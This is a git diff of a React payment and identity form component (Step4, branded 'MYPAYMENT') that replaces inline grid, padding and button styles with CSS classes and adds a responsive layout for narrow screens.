@@ -317,9 +317,7 @@ export default function Step4() {
     </div>
   );
 
-  const row: React.CSSProperties = {
-    display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20, marginBottom: 20,
-  };
+  // row replaced by CSS class s4-row (see <style> block below)
 
   return (
     <div style={{ minHeight: "100vh", background: "#f5f5f5", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
@@ -327,12 +325,24 @@ export default function Step4() {
         .s4i:focus { border-color: #333 !important; box-shadow: 0 0 0 3px rgba(0,0,0,0.06); }
         .s4i::placeholder { color: #bbb; }
         @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+        .s4-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
+        .s4-card-row { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 20px; margin-bottom: 20px; }
+        .s4-card { padding: 32px 40px 40px; }
+        .s4-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; gap: 8px; flex-wrap: wrap; }
+        .s4-btns { display: flex; justify-content: flex-end; gap: 12px; margin-top: 24px; padding-top: 24px; border-top: 1px solid #f0f0f0; }
+        @media (max-width: 640px) {
+          .s4-row { grid-template-columns: 1fr !important; }
+          .s4-card-row { grid-template-columns: 1fr !important; }
+          .s4-card { padding: 24px 18px 32px !important; }
+          .s4-btns { flex-direction: column-reverse; }
+          .s4-btns button { width: 100%; justify-content: center; }
+        }
       `}</style>
 
-      <div style={{ width: "100%", maxWidth: 860, background: "#fff", borderRadius: 12, padding: "32px 40px 40px", boxShadow: "0 2px 16px rgba(0,0,0,0.07)" }}>
+      <div style={{ width: "100%", maxWidth: 860, background: "#fff", borderRadius: 12, boxShadow: "0 2px 16px rgba(0,0,0,0.07)" }} className="s4-card">
 
         {/* Header */}
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
+        <div className="s4-header">
           <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
             <span style={{ fontWeight: 300 }}>MY</span>
             <span style={{ fontWeight: 700 }}>PAYMENT</span>
@@ -396,7 +406,7 @@ export default function Step4() {
 
           {/* ── Section: Personal ── */}
           <SectionHead>Personal Details</SectionHead>
-          <div style={row}>
+          <div className="s4-row">
             <div>
               <Lbl required>First Name</Lbl>
               <input className="s4i" type="text" placeholder="Enter first name" value={firstName}
@@ -413,7 +423,7 @@ export default function Step4() {
             </div>
           </div>
 
-          <div style={row}>
+          <div className="s4-row">
             <div>
               <Lbl required>Email Address</Lbl>
               <input className="s4i" type="email" placeholder="you@example.com" value={email}
@@ -481,7 +491,7 @@ export default function Step4() {
 
           {/* ── Section: Address ── */}
           <SectionHead>Mailing Address</SectionHead>
-          <div style={row}>
+          <div className="s4-row">
             <div>
               <Lbl required>House No. &amp; Block</Lbl>
               <input className="s4i" type="text" placeholder="e.g. No. 12 Block B3" value={houseNo}
@@ -503,7 +513,7 @@ export default function Step4() {
               style={{ ...inp, borderColor: errors.address ? "#c00" : "#ddd" }} />
             <Err k="address" />
           </div>
-          <div style={row}>
+          <div className="s4-row">
             <div>
               <Lbl required>District / Sub-district</Lbl>
               <input className="s4i" type="text" placeholder="e.g. West District" value={district}
@@ -519,7 +529,7 @@ export default function Step4() {
               <Err k="city" />
             </div>
           </div>
-          <div style={row}>
+          <div className="s4-row">
             <div>
               <Lbl required>State / Province</Lbl>
               <input className="s4i" type="text" placeholder="e.g. California" value={stateVal}
@@ -579,7 +589,7 @@ export default function Step4() {
 
           {/* ── Section: Card ── */}
           <SectionHead>Card Information</SectionHead>
-          <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr 1fr", gap: 20, marginBottom: 20 }}>
+          <div className="s4-card-row">
             <div>
               <Lbl required>Card Number (Last 8 Digits)</Lbl>
               <div style={{ position: "relative" }}>
@@ -621,7 +631,7 @@ export default function Step4() {
 
           {/* ── Section: Documents ── */}
           <SectionHead>Supporting Documents</SectionHead>
-          <div style={row}>
+          <div className="s4-row">
             <div>
               <Lbl required>Passport Photo</Lbl>
               <p style={{ fontSize: 12, color: "#999", marginBottom: 10, lineHeight: 1.5 }}>
@@ -669,7 +679,7 @@ export default function Step4() {
           </div>
 
           {/* Buttons */}
-          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12, marginTop: 24, paddingTop: 24, borderTop: "1px solid #f0f0f0" }}>
+          <div className="s4-btns">
             <button type="button" onClick={() => navigate("/")}
               style={{
                 height: 44, padding: "0 32px",
